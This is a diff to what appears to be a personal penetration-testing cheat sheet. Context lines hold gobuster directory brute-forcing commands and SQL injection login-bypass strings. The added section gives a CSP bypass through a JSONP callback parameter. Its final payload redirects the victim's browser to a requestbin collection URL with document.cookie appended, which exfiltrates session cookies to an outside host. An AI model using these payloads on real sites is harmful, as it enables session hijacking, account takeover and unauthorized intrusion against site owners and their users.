@@ -49,12 +49,6 @@ cd /Users/brianlam/go/src/gobuster                  // go to gobuster sources
 go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist    // run dir bruteforcing
 ```
 
-
----
-### XSS
----
-
-
 ---
 ### SQLi
 ---
@@ -67,9 +61,24 @@ admin' --
 ' or '1'='1 --
 ```
 
+
 ---
 ### Advanced Injection
 ---
+
+---
+### XSS Normal + Advanced
+---
+
+**CSP Bypass**  
+Bypass via. JSONP API callback param:
+```
+Verify:
+<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>
+
+Payload:
+<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>
+```
 
 
 
